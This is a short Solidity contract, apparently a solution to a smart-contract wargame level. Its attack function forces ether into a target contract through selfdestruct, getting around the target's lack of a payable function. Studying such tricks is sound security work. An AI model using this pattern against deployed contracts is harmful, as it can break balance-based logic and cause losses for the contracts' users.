// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract ForceAttacker {
    error MSG_VALUE_REQUIRED();

    constructor() payable {}

    function attack(address target) public payable {
        if(msg.value == 0){
            revert MSG_VALUE_REQUIRED();
        }
        selfdestruct(payable(target));
    }
}
